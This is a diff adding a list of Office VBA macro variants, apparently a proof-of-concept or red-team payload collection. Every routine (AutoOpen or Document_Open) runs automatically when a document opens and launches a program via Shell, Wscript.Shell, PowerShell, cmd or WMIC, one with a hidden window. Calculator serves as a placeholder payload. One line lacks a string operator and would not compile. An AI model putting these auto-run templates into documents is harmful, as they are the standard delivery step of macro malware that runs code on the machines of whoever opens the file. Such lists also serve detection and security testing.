@@ -1,0 +1,55 @@
+Sub AutoOpen()
+	Dim Str As String
+	Str = Str + "powershell -c calc.exe"	
+	CreateObject("Wscript.Shell").Run Str
+End Sub
+
+Sub Document_Open()
+	Call Shell("calc.exe", vbNormalFocus)
+End Sub
+
+Sub Document_Open()
+	Call Shell("powershell.exe calc.exe", vbNormalFocus)
+End Sub
+
+Sub Document_Open()
+	Call Shell("cmd.exe /c calc.exe", vbNormalFocus)
+End Sub
+
+Sub Document_Open()
+	Dim wshShell As Object
+	Set wshShell = CreateObject("Wscript.shell")
+	wshShell.Run "cmd.exe /c calc.exe", 1, True
+End Sub
+
+Sub Document_Open()
+	Dim calcPath As String
+	calcPath = "C:\Windows\System32\calc.exe"
+	Call Shell(calcPath, vbNormalFocus)
+End Sub
+
+Sub Document_Open()
+	Dim Ps As String
+	Ps = "C:\Windows\System32\powershell.exe"
+	Call Shell(Ps "-c calc.exe", vbNormalFocus)
+End Sub
+
+Sub Document_Open()
+	Dim calcPath As String
+	calcPath = "C:\Windows\System32\cmd.exe /c calc.exe"
+	Call Shell(calcPath, vbNormalFocus)
+End Sub
+
+Sub Document_Open()
+	Dim calcPath As String
+	calcPath = "C:\Windows\System32\cmd.exe /c calc.exe"
+	Call Shell(calcPath, vbHide)
+End Sub
+
+Sub Document_Open()
+	Call Shell("wmic process call create cmd.exe /c calc.exe", vbNormalFocus)
+End Sub
+
+Sub Document_Open()
+	Call Shell("wmic process call create calc.exe", vbNormalFocus)
+End Sub
